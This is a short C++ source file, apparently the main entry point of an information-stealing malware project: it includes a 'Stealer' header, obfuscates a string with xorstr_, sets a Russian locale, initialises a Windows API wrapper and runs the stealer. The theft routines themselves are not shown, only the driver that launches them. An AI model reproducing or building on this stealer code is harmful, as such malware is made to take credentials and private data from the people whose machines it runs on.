#include "stealer/Stealer.h"
#include "winapi.h"
#include <locale>

int main() {
    std::locale::global(std::locale(""));
    setlocale(LC_ALL, xorstr_("ru-RU"));

    WinApi::Init();

    Stealer stealer;
    stealer.run();
    stealer.complete();

    return 0;
}
